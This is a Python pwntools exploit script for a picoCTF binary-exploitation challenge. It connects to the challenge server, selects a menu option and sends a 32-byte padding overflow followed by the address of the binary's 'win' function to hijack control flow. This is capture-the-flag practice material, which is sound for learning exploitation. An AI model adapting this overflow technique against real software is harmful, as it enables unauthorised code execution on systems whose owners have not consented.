#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 56808)

    return r


def main():
    r = conn()
    r.recvuntil(b"choice:")
    r.sendline(b'2')
    payload =b"A"*32 + p64(exe.symbols["win"])
    print(p64(exe.symbols["win"]))
    r.sendline(payload)
    r.recvuntil(b"choice:")
    r.sendline(b'4')
    print(r.recv())
    # good luck pwning :)S

    r.interactive()

if __name__ == "__main__":
    main()
